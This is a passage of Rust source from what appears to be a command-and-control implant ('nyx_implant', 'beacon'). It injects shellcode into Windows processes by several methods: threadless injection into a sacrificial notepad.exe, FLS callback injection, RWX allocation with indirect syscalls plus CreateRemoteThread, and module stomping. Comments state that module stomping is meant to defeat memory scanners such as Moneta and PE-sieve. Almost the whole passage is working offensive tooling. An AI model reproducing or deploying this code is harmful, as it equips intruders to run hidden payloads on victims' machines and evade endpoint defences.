            "unknown inject method",
        )),
    }
}

/// Method 1 on the sacrificial path: create the sacrificial process and
/// threadless-inject into its suspended main thread.
fn do_inject_sacrificial_threadless(spawn_to: &str, shellcode: &[u8]) -> nyx_protocol::Response {
    let target = if spawn_to.is_empty() {
        "notepad.exe"
    } else {
        spawn_to
    };
    match unsafe { create_sacrificial(target) } {
        Ok(mut proc) => {
            let res = match unsafe { threadless_inject(proc.handle, proc.main_thread, shellcode) } {
                Ok(()) => {
                    // The sacrificial's main thread is now executing
                    // the shellcode — the Drop guard must NOT terminate
                    // it (it only closes the handles on drop).
                    proc.mark_resumed();
                    let mut msg = nyx_implant_core::heap::String::from(
                        "threadless inject ok (sacrificial pid=",
                    );
                    let mut buf = [0u8; 10];
                    let mut n = proc.pid;
                    let mut i = buf.len();
                    if n == 0 {
                        buf[0] = b'0';
                        i = 1;
                    } else {
                        while n > 0 {
                            i -= 1;
                            buf[i] = b'0' + (n % 10) as u8;
                            n /= 10;
                        }
                    }
                    for &b in &buf[i..] {
                        msg.push(b as char);
                    }
                    msg.push(')');
                    nyx_protocol::Response::Output(msg.into_bytes())
                }
                Err(e) => nyx_protocol::Response::Err(nyx_implant_core::heap::String::from(e)),
            };
            // The Drop guard on `proc` owns cleanup: on success it
            // closes the handles fire-and-forget; on failure it
            // terminates the suspended sacrificial + closes both
            // handles — no path leaks.
            res
        }
        Err(e) => nyx_protocol::Response::Err(nyx_implant_core::heap::String::from(e)),
    }
}

/// Method 3 on the sacrificial path: spawn the sacrificial RUNNING (a
/// suspended one has no kernel32 mapped yet — a remote FlsAlloc thread would
/// start at an unmapped address), wait for kernel32 to load, then FLS-inject
/// into it.
fn do_inject_sacrificial_fls(
    spawn_to: &str,
    shellcode: &[u8],
    warn_prefix: nyx_implant_core::heap::String,
) -> nyx_protocol::Response {
    if !crate::fls::fls_inject_enabled() {
        // Disarmed: creating a sacrificial just to terminate it is wasteful
        // and noisy — fail fast (the method-2 gate-check precedent).
        let mut msg = warn_prefix;
        msg.push_str("fls callback inject disabled (gate off)");
        return nyx_protocol::Response::Err(nyx_implant_core::heap::String::from(msg));
    }
    let target = if spawn_to.is_empty() {
        "notepad.exe"
    } else {
        spawn_to
    };
    match unsafe { create_sacrificial_running(target) } {
        Ok(mut proc) => {
            let res = match unsafe { wait_remote_kernel32(proc.handle) } {
                Ok(()) => {
                    match unsafe { crate::fls::fls_callback_inject(proc.handle, shellcode) } {
                        Ok(()) => {
                            // The payload is executing in the target (in a
                            // fresh remote thread, not the main thread) — the
                            // Drop guard must NOT terminate the process (it
                            // only closes the handles on drop).
                            proc.mark_resumed();
                            let mut msg = warn_prefix;
                            msg.push_str("fls callback inject ok (sacrificial pid=");
                            let mut buf = [0u8; 10];
                            let mut n = proc.pid;
                            let mut i = buf.len();
                            if n == 0 {
                                buf[0] = b'0';
                                i = 1;
                            } else {
                                while n > 0 {
                                    i -= 1;
                                    buf[i] = b'0' + (n % 10) as u8;
                                    n /= 10;
                                }
                            }
                            for &b in &buf[i..] {
                                msg.push(b as char);
                            }
                            msg.push(')');
                            nyx_protocol::Response::Output(msg.into_bytes())
                        }
                        Err(e) => {
                            nyx_protocol::Response::Err(nyx_implant_core::heap::String::from(e))
                        }
                    }
                }
                Err(e) => nyx_protocol::Response::Err(nyx_implant_core::heap::String::from(e)),
            };
            // The Drop guard on `proc` owns cleanup: on success it closes the
            // handles fire-and-forget; on failure it terminates the running
            // sacrificial + closes both handles — no path leaks.
            res
        }
        Err(e) => nyx_protocol::Response::Err(nyx_implant_core::heap::String::from(e)),
    }
}

/// Poll the target's loader list until kernel32 is mapped — i.e. process init
/// has progressed far enough that a remote thread starting at a kernel32
/// export (FlsAlloc / the trigger stub's FlsSetValue) runs on real code.
/// Bounded: 50 × 100 ms.
pub(crate) unsafe fn wait_remote_kernel32(h: *mut core::ffi::c_void) -> Result<(), &'static str> {
    for _ in 0..50 {
        if unsafe { remote_module_base(h, b"kernel32.dll") }.is_some() {
            return Ok(());
        }
        unsafe { sleep_ms(100) };
    }
    Err("target: kernel32 not mapped (loader never ran)")
}

/// Existing-process FLS callback injection (method 3 + pid != 0). Opens the
/// target with the minimal rights the version-agnostic path needs — no
/// PROCESS_VM_READ: unlike module stomp / Pool Party, fls_callback_inject
/// never reads remote memory (the target's own ntdll does the FLS
/// bookkeeping). PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
/// PROCESS_VM_WRITE | PROCESS_QUERY_LIMITED_INFORMATION = 0x102A (the
/// QUERY_LIMITED bit lets IsWow64Process2 classify the target architecture —
/// fls.rs's Prism refusal is scoped to cross-arch targets, 2026-08-24).
fn do_inject_existing_fls(
    pid: u32,
    shellcode: &[u8],
    warn_prefix: nyx_implant_core::heap::String,
) -> nyx_protocol::Response {
    match unsafe { inject_existing_fls(pid, shellcode) } {
        Ok(()) => {
            let mut msg = warn_prefix;
            msg.push_str("fls callback inject ok (pid=");
            let mut buf = [0u8; 10];
            let mut n = pid;
            let mut i = buf.len();
            if n == 0 {
                buf[0] = b'0';
                i = 1;
            } else {
                while n > 0 {
                    i -= 1;
                    buf[i] = b'0' + (n % 10) as u8;
                    n /= 10;
                }
            }
            for &b in &buf[i..] {
                msg.push(b as char);
            }
            msg.push(')');
            nyx_protocol::Response::Output(msg.into_bytes())
        }
        Err(e) => nyx_protocol::Response::Err(nyx_implant_core::heap::String::from(e)),
    }
}

/// Open `pid` and hand the handle to [`crate::fls::fls_callback_inject`]. The
/// handle is closed on every path (the inject does not retain it).
unsafe fn inject_existing_fls(pid: u32, shellcode: &[u8]) -> Result<(), &'static str> {
    let op: OpenProcessFn = match export_addr(b"kernel32.dll", b"OpenProcess") {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Err("OpenProcess unresolved"),
    };
    // PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
    // PROCESS_QUERY_LIMITED_INFORMATION (see do_inject_existing_fls docs).
    let h_proc = unsafe { op(0x102A, 0, pid) };
    if h_proc.is_null() || h_proc as usize == usize::MAX {
        return Err("OpenProcess failed (pid/access)");
    }
    let res = unsafe { crate::fls::fls_callback_inject(h_proc, shellcode) };
    if let Some(addr) = export_addr(b"kernel32.dll", b"CloseHandle") {
        let close: CloseHandleFn = unsafe { core::mem::transmute(addr) };
        let _ = unsafe { close(h_proc) };
    }
    res
}

/// Inject shellcode into an EXISTING process (pid != 0).
///
/// Opens the target via `OpenProcess`, allocates RWX via indirect syscall
/// `NtAllocateVirtualMemory`, writes via `NtWriteVirtualMemory`, creates a
/// remote thread via `CreateRemoteThread` (kernel32, PEB-walk resolved).
/// Works on all Windows versions (XP+).
///
/// # Safety
/// Cross-process handle + memory operations. Single-threaded beacon context.
unsafe fn inject_existing(pid: u32, shellcode: &[u8]) -> Result<(), &'static str> {
    let fns = unsafe { inject_existing_resolve() }?;
    // PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | QUERY
    let h_proc = unsafe { (fns.op)(0x102A, 0, pid) };
    if h_proc.is_null() || h_proc as usize == usize::MAX {
        return Err("OpenProcess failed (pid/access)");
    }

    let rt = nyx_implant_core::syscalls::global().ok_or("syscall runtime down")?;

    let remote_base = unsafe { inject_existing_stage_alloc(&fns, rt, h_proc, shellcode) }?;
    unsafe { inject_existing_stage_thread(&fns, h_proc, remote_base) }?;

    unsafe { (fns.ch)(h_proc) };
    Ok(())
}

/// OpenProcess / CreateRemoteThread / CloseHandle resolved once per inject.
struct InjectFns {
    op: OpenProcessFn,
    crt: CreateRemoteThreadFn,
    ch: CloseHandleFn,
}

type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
type CreateRemoteThreadFn = unsafe extern "system" fn(
    *mut c_void,
    *mut c_void,
    usize,
    Option<unsafe extern "system" fn(*mut c_void) -> u32>,
    *mut c_void,
    u32,
    *mut c_void,
) -> *mut c_void;
type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;

/// Resolve + transmute OpenProcess / CreateRemoteThread / CloseHandle.
unsafe fn inject_existing_resolve() -> Result<InjectFns, &'static str> {
    let op: OpenProcessFn = match export_addr(b"kernel32.dll", b"OpenProcess") {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Err("OpenProcess unresolved"),
    };
    let crt: CreateRemoteThreadFn = match export_addr(b"kernel32.dll", b"CreateRemoteThread") {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Err("CreateRemoteThread unresolved"),
    };
    let ch: CloseHandleFn = match export_addr(b"kernel32.dll", b"CloseHandle") {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Err("CloseHandle unresolved"),
    };
    Ok(InjectFns { op, crt, ch })
}

/// Steps 1-2: allocate RWX in the target via indirect syscall + write the
/// shellcode. On failure the process handle is closed here.
unsafe fn inject_existing_stage_alloc(
    fns: &InjectFns,
    rt: &'static nyx_implant_core::syscalls::Runtime,
    h_proc: *mut core::ffi::c_void,
    shellcode: &[u8],
) -> Result<usize, &'static str> {
    // 1. Allocate RWX in target via indirect syscall.
    let mut remote_base: usize = 0;
    let mut region_size: usize = shellcode.len();
    let alloc_status = unsafe {
        nyx_implant_core::syscalls::nt_allocate_virtual_memory(
            rt,
            h_proc as usize,
            0, // ZeroBits
            &mut remote_base,
            &mut region_size,
            0x3000,
            0x40, // MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
        )
    };
    if alloc_status.map_or(true, |s| s < 0) {
        unsafe { (fns.ch)(h_proc) };
        return Err("remote alloc failed");
    }

    // 2. Write shellcode via indirect syscall.
    let mut written: usize = 0;
    let write_status = unsafe {
        nyx_implant_core::syscalls::nt_write_virtual_memory(
            rt,
            h_proc as usize,
            remote_base,
            shellcode.as_ptr(),
            shellcode.len(),
            &mut written,
        )
    };
    if write_status.map_or(true, |s| s < 0) {
        unsafe { (fns.ch)(h_proc) };
        return Err("remote write failed");
    }
    Ok(remote_base)
}

/// Step 3: CreateRemoteThread with lpStartAddress = the shellcode base. On
/// failure the process handle is closed here.
///
/// v0.3.0 passed None for lpStartAddress and the shellcode address as
/// lpParameter (arg 5) — the kernel rejects a NULL start address and the
/// call always returned NULL, so the primary existing-process inject path
/// was 100% broken (always hit the 'CreateRemoteThread failed' arm).
/// CRITICAL-14 in docs/audits/FULL_CODE_AUDIT_2026-07-21.md.
///
/// Fix mirrors the working remote_load_library pattern at inject.rs:331:
/// wrap a transmuted function pointer in Some(...) for arg 4, pass null
/// for arg 5 (our shellcode takes no parameter).
unsafe fn inject_existing_stage_thread(
    fns: &InjectFns,
    h_proc: *mut core::ffi::c_void,
    remote_base: usize,
) -> Result<(), &'static str> {
    type ThreadProc = unsafe extern "system" fn(*mut c_void) -> u32;
    let start_proc: ThreadProc = unsafe { core::mem::transmute(remote_base) };
    let h_thread = unsafe {
        (fns.crt)(
            h_proc,
            core::ptr::null_mut(),
            0,
            Some(start_proc),
            core::ptr::null_mut(),
            0,
            core::ptr::null_mut(),
        )
    };
    if h_thread.is_null() {
        unsafe { (fns.ch)(h_proc) };
        return Err("CreateRemoteThread failed");
    }

    unsafe { (fns.ch)(h_thread) };
    Ok(())
}

// ---- ProcessInjectKit (P2.1c) ---------------------------------------------
//
// (WP-C 断环第二刀: moved out of `evasion_glue` so the evasion side no longer
// depends on `inject` — the SDK inject glue lives next to the technique.)
//
// Routes the SDK `ProcessInjectKit::inject(spawn_to, shellcode)` contract to
// `crate::inject::module_stomp`. Module stomping makes the injected shellcode
// disk-backed + RX (a stomped legit DLL's .text) instead of unbacked RWX, so
// Moneta exec-private / PE-sieve unbacked-memory checks pass. The actual
// stomp+resume is gated (`inject::modulestomp_enabled`, default **ON**) — the
// full module-stomping path runs (spawn suspended → stomp `.text` → resume).
// `set_modulestomp_enabled(false)` collapses it to a verifiable data path
// (CreateProcessW suspended, no cross-process execute) for targets that forbid
// cross-process injection. module_stomp owns cleanup: the returned
// `SacrificialProcess` is Drop-guarded (terminate + close both handles on
// every non-success path; close-only once the target was resumed).

/// Live process injector: module stomping. See the module docs for the
/// technique + why the execution tail is gated.
pub struct ModuleStomper;

impl nyx_implant_evasionsdk::ProcessInjectKit for ModuleStomper {
    fn inject(
        &self,
        spawn_to: &str,
        shellcode: &[u8],
    ) -> Result<nyx_implant_evasionsdk::InjectHandle, nyx_implant_evasionsdk::EvasionError> {
        use nyx_implant_evasionsdk::EvasionError;
        // SAFETY: runs in the single-threaded beacon context. module_stomp
        // owns cleanup via the Drop-guarded SacrificialProcess: on failure it
        // terminates + closes; on success it closes the handles (fire-and-
        // forget) once the target was resumed.
        if !modulestomp_enabled() {
            // Disarmed: module_stomp would create a suspended sacrificial
            // that the Drop guard then terminates — never report success for
            // a process that was killed before it ran anything.
            return Err(EvasionError::Other(sdk_err_string("module stomp disabled")));
        }
        let proc = unsafe { module_stomp(spawn_to, shellcode) }
            .map_err(|msg| EvasionError::Other(sdk_err_string(msg)))?;
        // The guard closes the handles when `proc` drops at the end of this
        // call; the returned InjectHandle is therefore a STALE diagnostic
        // snapshot (pid/type only), not an operable handle — callers must not
        // use it for handle operations.
        let pid = proc.pid;
        Ok(nyx_implant_evasionsdk::InjectHandle::new(pid as usize))
    }
}

/// Copy a `&str` error into an owned `String` for `EvasionError::Other`
/// (mirror of the helper the other SDK glue modules use).
fn sdk_err_string(s: &str) -> alloc::string::String {
    let mut out = alloc::string::String::new();
    out.push_str(s);
    out
}
